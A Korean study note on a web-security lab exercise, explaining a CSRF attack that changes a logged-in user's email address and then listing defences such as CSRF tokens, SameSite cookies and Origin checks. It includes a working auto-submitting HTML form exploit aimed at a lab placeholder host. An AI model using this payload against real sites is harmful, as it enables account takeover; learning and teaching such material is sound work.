## 🕵️‍♂️ 이메일 주소 변경하는 공격

*CSRF (Cross-site Request Forgery)* <br />
*사용자가 로그인된 웹사이트에서 의도하지 않은 요청(비밀번호 변경, 송금)을 보내도록 만드는 웹 보안 공격* <br />

<br />

### 🧪 실습

**1️⃣ 취약점 확인**

✓ 로그인 후 이메일 주소를 변경하여 개인 정보를 통제할 수 있다. <br /><br />
<img width="250" height="190" alt="image" src="https://github.com/user-attachments/assets/fabb1a59-fe5b-4f07-a397-02429a349fe5" />

✓ 쿠키 기반으로 세션 핸들링 되고있다. <br /><br />
<img width="515" height="102" alt="image" src="https://github.com/user-attachments/assets/aa6b91c9-0c6e-4229-bf0f-1bfe256cec5d" />

✓ 예측 가능한 파라미터만 가지고 있다. 요청마다 추가되는 임의의 코드가 있다면 취약하지 않다. <br /><br />
<img width="508" height="88" alt="image" src="https://github.com/user-attachments/assets/9d237bea-4391-46bc-94f8-62264acfccb8" />

<br />

**2️⃣ 임의의 이메일 주소를 저장하는 익스플로잇 HTML 삽입:**

**Exploit:** 취약점을 이용하는 행위 또는 코드 ex) 관리자 권한 탈취, 데이터 유출, 원격 코드 실행 (RCE) <br />
*(취약점 예시: 보안 패치 안 된 웹 서버, 입력값 검증이 없는 API, 권한 체크가 빠진 기능)* <br />

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```


### 🛡️ 방어책

**CSRF 토큰**: <br />
서버가 랜덤 토큰을 발급, 요청 시 함께 보내지 않으면 거부 <br />
서버 세션에 저장하고 프론트에서 요청마다 포함

**SameSite Cookie 설정**: <br />
```
Set-Cookie: sessionId=abc;
  Secure;
  HttpOnly;
  SameSite=Lax // Lax: GET 이동은 허용, POST 등은 차단
```

**Referer / Origin 검증**: <br />
서버에서 도메인 확인 및 차단 <br />
프록시, 브라우저 정책 영향으로 보조 수단으로 사용

**CORS ≠ CSRF 방어 ❌**: <br />
CORS: 응답을 읽을 수 있느냐 / CSRF: 요청 자체가 가느냐
